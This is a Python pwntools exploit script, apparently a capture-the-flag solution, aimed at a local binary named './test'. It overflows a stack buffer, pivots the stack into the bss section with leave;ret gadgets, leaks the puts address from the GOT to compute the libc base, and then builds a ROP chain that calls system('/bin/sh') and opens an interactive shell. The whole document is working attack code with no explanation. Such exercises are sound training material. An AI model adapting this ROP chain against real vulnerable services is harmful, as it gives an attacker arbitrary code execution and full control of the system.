from pwn import *
context(arch='amd64', os='linux', log_level='debug')
filename = "./test"
elf=ELF("./test")
s=process("./test")
libc = elf.libc
# gdb.debug(filename,"b * 0x4011FF")
gdb.attach(s,"b *0x401216 ")
bss = elf.bss() + 0x700

read_addr = 0x4011FB 
p = b'a'*0x30 + p64(bss ) + p64(read_addr) 
s.sendafter("what can you do?\n",p)

pop_rdi = 0x0040117e
leave_ret = 0x0000000000401216
puts_plt = elf.plt.puts
puts_got = elf.got.puts
p = p64(bss + 0x100) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_addr)
p = p.ljust(0x30,b'a') + p64(bss - 0x30) + p64(leave_ret)

s.send(p)

puts_addr = u64(s.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) 
libc_base = puts_addr - 0x80e50
print("libc_base",hex(libc_base))
system_addr = libc_base + libc.sym["system"]
bin_sh = libc_base +  next(libc.search(b'/bin/sh'))
ret = 0x000000000040101a
p = p64(0) + p64(pop_rdi ) + p64(bin_sh) + p64(ret) +p64(system_addr) 
p = p.ljust(0x30,b'a') + p64(bss + 0x100 - 0x30) + p64(leave_ret)

s.send(p)

s.interactive()
